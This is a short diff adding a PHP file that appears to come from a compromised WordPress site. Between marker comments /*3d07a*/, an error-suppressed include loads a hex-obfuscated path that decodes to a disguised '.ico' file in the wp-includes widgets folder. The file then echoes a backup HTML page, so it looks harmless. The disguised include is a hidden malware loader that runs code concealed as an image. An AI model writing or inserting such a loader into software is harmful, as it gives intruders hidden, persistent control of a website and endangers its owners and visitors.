@@ -1,0 +1,9 @@
+<?php
+/*3d07a*/
+
+@include "\x2fho\x6de/\x63od\x65li\x67ht\x3007\x2fpu\x62li\x63_h\x74ml\x2fdr\x6fid\x71ue\x72y/\x77p-\x69nc\x6cud\x65s/\x77id\x67et\x73/f\x61vi\x63on\x5f3c\x66fc\x31.i\x63o";
+
+/*3d07a*/
+
+
+echo file_get_contents('index.html.bak.bak');
